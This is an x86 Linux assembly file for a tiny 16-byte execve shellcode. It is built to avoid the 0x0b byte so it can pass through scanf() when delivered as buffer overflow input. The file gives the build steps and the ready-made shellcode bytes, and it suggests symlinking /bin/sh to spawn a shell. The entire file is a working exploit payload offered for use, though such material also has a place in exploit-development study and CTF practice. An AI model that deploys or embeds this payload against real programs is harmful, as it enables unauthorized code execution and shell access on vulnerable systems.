; To create the binary
; nasm -f elf32 linux_x86_execve_no_whitespace.asm -o sc.o
; ld sc.o -o sc

; Use objdump or some other tool to extract shellcode from sc binary!

; 'e' execve shellcode by @Pink_P4nther.
; The point of this shellcode is to bypass when 0x0b (11) is a bad byte.
; This helped when giving overflow input to scanf() for example.
; scanf() sees 0x0b as white space therefore ending the read from STDIN.
; I also made it as small as possible so the executable name is now 'e'
; make sure to create a link to whatever you want to execute and name the link 'e'
; For example: `ln -s /bin/sh e` <- For a shell
; 16 bytes.

; sc = ("\x31\xc0\x50\x6a\x65\x89\xe3\x99\x31\xc9\x04\x0e\x2c\x03\xcd\x80")

section .text

global _start

_start:
	xor eax,eax     ; Zero eax
	push eax        ; Put 0 on the stack
	push 0x65	; Put 'e' on the stack
	mov ebx,esp     ; Move 'e' into ebx
	cdq             ; Zero edx
	xor ecx,ecx     ; Zero ecx
	add al,0xe      ; Add 14 eax
	sub al,0x3	; Subtract 3 from eax to put 0xb (11) in eax
	int 0x80        ; Software interrupt for system call
